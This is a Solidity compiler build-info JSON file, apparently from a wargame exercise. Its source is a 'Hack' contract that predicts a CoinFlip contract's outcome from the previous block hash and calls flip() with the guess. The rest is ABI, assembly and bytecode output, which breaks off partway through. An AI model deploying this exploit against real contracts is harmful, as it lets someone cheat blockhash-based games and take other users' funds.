{
	"id": "cd87ef4409c6e2580cf91e5be615fc1e",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.12",
	"solcLongVersion": "0.6.12+commit.27d51765",
	"input": {
		"language": "Solidity",
		"sources": {
			"CoinFlip.sol": {
				"content": "pragma solidity ^0.6.0;\n// SPDX-License-Identifier: MIT\n\n\ninterface CoinFlip{\n    function flip(bool _guess) external returns (bool);\n}\n\ncontract Hack{\n    CoinFlip coin_flip;\n    // Creating an object of interface\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    bool public side;\n\n    constructor(address _addr) public{\n        coin_flip = CoinFlip(_addr);\n    }\n\n    function hack() public{\n        uint256 blockValue = uint256(blockhash(block.number -1));\n        uint256 coinFlip = uint256(uint256(blockValue)/ FACTOR);\n        side = coinFlip == 1 ? true : false;\n        coin_flip.flip(side);\n    }\n\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"CoinFlip.sol": {
				"CoinFlip": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"CoinFlip.sol\":\"CoinFlip\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"CoinFlip.sol\":{\"keccak256\":\"0xb7eb5b7b3710132effcc08a13314f81663cc09518e4b8be33f3fac8d22392b0f\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://636b6019b0546f87ee55618dea68ecfff1d15e1f2e7e54db54eeeefa9b85dce2\",\"dweb:/ipfs/Qmf6bDw4J13YiXMaJHviTVaDPX5A4bVi6uup7Pt25girzz\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"Hack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_addr",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "hack",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "side",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"CoinFlip.sol\":137:663  contract Hack{... */\n  mstore(0x40, 0x80)\n    /* \"CoinFlip.sol\":236:313  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"CoinFlip.sol\":219:313  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x01\n  sstore\n    /* \"CoinFlip.sol\":342:419  constructor(address _addr) public{... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"CoinFlip.sol\":406:411  _addr */\n  dup1\n    /* \"CoinFlip.sol\":385:394  coin_flip */\n  0x00\n  dup1\n    /* \"CoinFlip.sol\":385:412  coin_flip = CoinFlip(_addr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"CoinFlip.sol\":342:419  constructor(address _addr) public{... */\n  pop\n    /* \"CoinFlip.sol\":137:663  contract Hack{... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"CoinFlip.sol\":137:663  contract Hack{... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x4de260a2\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x8475c028\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"CoinFlip.sol\":425:660  function hack() public{... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"CoinFlip.sol\":319:335  bool public side */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip.sol\":425:660  function hack() public{... */\n    tag_6:\n        /* \"CoinFlip.sol\":457:475  uint256 blockValue */\n      0x00\n        /* \"CoinFlip.sol\":510:511  1 */\n      0x01\n        /* \"CoinFlip.sol\":496:508  block.number */\n      number\n        /* \"CoinFlip.sol\":496:511  block.number -1 */\n      sub\n        /* \"CoinFlip.sol\":486:512  blockhash(block.number -1) */\n      blockhash\n        /* \"CoinFlip.sol\":478:513  uint256(blockhash(block.number -1)) */\n      0x00\n      shr\n        /* \"CoinFlip.sol\":457:513  uint256 blockValue = uint256(blockhash(block.number -1)) */\n      swap1\n      pop\n        /* \"CoinFlip.sol\":523:539  uint256 coinFlip */\n      0x00\n        /* \"CoinFlip.sol\":571:577  FACTOR */\n      sload(0x01)\n        /* \"CoinFlip.sol\":558:568  blockValue */\n      dup3\n        /* \"CoinFlip.sol\":550:577  uint256(blockValue)/ FACTOR */\n      dup2\n      tag_10\n      jumpi\n      invalid\n    tag_10:\n      div\n        /* \"CoinFlip.sol\":523:578  uint256 coinFlip = uint256(uint256(blockValue)/ FACTOR) */\n      swap1\n      pop\n        /* \"CoinFlip.sol\":607:608  1 */\n      0x01\n        /* \"CoinFlip.sol\":595:603  coinFlip */\n      dup2\n        /* \"CoinFlip.sol\":595:608  coinFlip == 1 */\n      eq\n        /* \"CoinFlip.sol\":595:623  coinFlip == 1 ? true : false */\n      tag_11\n      jumpi\n        /* \"CoinFlip.sol\":618:623  false */\n      0x00\n        /* \"CoinFlip.sol\":595:623  coinFlip == 1 ? true : false */\n      jump(tag_12)\n    tag_11:\n        /* \"CoinFlip.sol\":611:615  true */\n      0x01\n        /* \"CoinFlip.sol\":595:623  coinFlip == 1 ? true : false */\n    tag_12:\n        /* \"CoinFlip.sol\":588:592  side */\n      0x02\n      0x00\n        /* \"CoinFlip.sol\":588:623  side = coinFlip == 1 ? true : false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"CoinFlip.sol\":633:642  coin_flip */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"CoinFlip.sol\":633:647  coin_flip.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"CoinFlip.sol\":648:652  side */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"CoinFlip.sol\":633:653  coin_flip.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_15:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x20\n      dup2\n      lt\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      pop\n        /* \"CoinFlip.sol\":425:660  function hack() public{... */\n      pop\n      pop\n      jump\t// out\n        /* \"CoinFlip.sol\":319:335  bool public side */\n    tag_8:\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n\n    auxdata: 0xa26469706673582212205c7fb7473ea06eeeedfa76cfbba109d63d51ce78a2b312bd7e7fa33dfbe80a6464736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060015534801561003457600080fd5b506040516102713803806102718339818101604052602081101561005757600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101b9806100b86000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80634de260a21461003b5780638475c02814610045575b600080fd5b610043610065565b005b61004d610170565b60405180821515815260200191505060405180910390f35b6000600143034060001c90506000600154828161007e57fe5b04905060018114610090576000610093565b60015b600260006101000a81548160ff02191690831515021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67600260009054906101000a900460ff166040518263ffffffff1660e01b8152600401808215158152602001915050602060405180830381600087803b15801561013057600080fd5b505af1158015610144573d6000803e3d6000fd5b505050506040513d602081101561015a57600080fd5b8101908080519060200190929190505050505050565b600260009054906101000a900460ff168156fea26469706673582212205c7fb7473ea06eeeedfa76cfbba109d63d51ce78a2b312bd7e7fa33dfbe80a6464736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x271 CODESIZE SUB DUP1 PUSH2 0x271 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x57 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x1B9 DUP1 PUSH2 0xB8 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x8475C028 EQ PUSH2 0x45 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x65 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4D PUSH2 0x170 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER SUB BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 PUSH1 0x1 SLOAD DUP3 DUP2 PUSH2 0x7E JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH1 0x1 DUP2 EQ PUSH2 0x90 JUMPI PUSH1 0x0 PUSH2 0x93 JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x130 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x144 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x15A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x5C PUSH32 0xB7473EA06EEEEDFA76CFBBA109D63D51CE78A2B312BD7E7FA33DFBE80A646473 PUSH16 0x6C634300060C00330000000000000000 ",
							"sourceMap": "137:526:0:-:0;;;236:77;219:94;;342:77;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;406:5;385:9;;:27;;;;;;;;;;;;;;;;;;342:77;137:526;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80634de260a21461003b5780638475c02814610045575b600080fd5b610043610065565b005b61004d610170565b60405180821515815260200191505060405180910390f35b6000600143034060001c90506000600154828161007e57fe5b04905060018114610090576000610093565b60015b600260006101000a81548160ff02191690831515021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67600260009054906101000a900460ff166040518263ffffffff1660e01b8152600401808215158152602001915050602060405180830381600087803b15801561013057600080fd5b505af1158015610144573d6000803e3d6000fd5b505050506040513d602081101561015a57600080fd5b8101908080519060200190929190505050505050565b600260009054906101000a900460ff168156fea26469706673582212205c7fb7473ea06eeeedfa76cfbba109d63d51ce78a2b312bd7e7fa33dfbe80a6464736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x8475C028 EQ PUSH2 0x45 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x65 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4D PUSH2 0x170 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER SUB BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 PUSH1 0x1 SLOAD DUP3 DUP2 PUSH2 0x7E JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH1 0x1 DUP2 EQ PUSH2 0x90 JUMPI PUSH1 0x0 PUSH2 0x93 JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x130 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x144 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x15A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x5C PUSH32 0xB7473EA06EEEEDFA76CFBBA109D63D51CE78A2B312BD7E7FA33DFBE80A646473 PUSH16 0x6C634300060C00330000000000000000 ",
							"sourceMap": "137:526:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;425:235;;;:::i;:::-;;319:16;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;425:235;457:18;510:1;496:12;:15;486:26;478:35;;457:56;;523:16;571:6;;558:10;550:27;;;;;;523:55;;607:1;595:8;:13;:28;;618:5;595:28;;;611:4;595:28;588:4;;:35;;;;;;;;;;;;;;;;;;633:9;;;;;;;;;;:14;;;648:4;;;;;;;;;;;633:20;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;425:235;;:::o;319:16::-;;;;;;;;;;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "88200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"hack()": "infinite",
								"side()": "1047"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 137,
									"end": 663,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 137,
									"end": 663,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 137,
									"end": 663,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 236,
									"end": 313,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 219,
									"end": 313,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 219,
									"end": 313,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 342,
									"end": 419,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 342,
									"end": 419,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 342,
									"end": 419,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 342,
									"end": 419,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 342,
									"end": 419,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 342,
									"end": 419,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "LT",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 342,
									"end": 419,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 342,
									"end": 419,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 342,
									"end": 419,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 342,
									"end": 419,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 406,
									"end": 411,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 385,
									"end": 394,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 385,
									"end": 394,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 385,
									"end": 412,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 385,
									"end": 412,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 385,
									"end": 412,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 385,
									"end": 412,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 342,
									"end": 419,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 137,
									"end": 663,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 137,
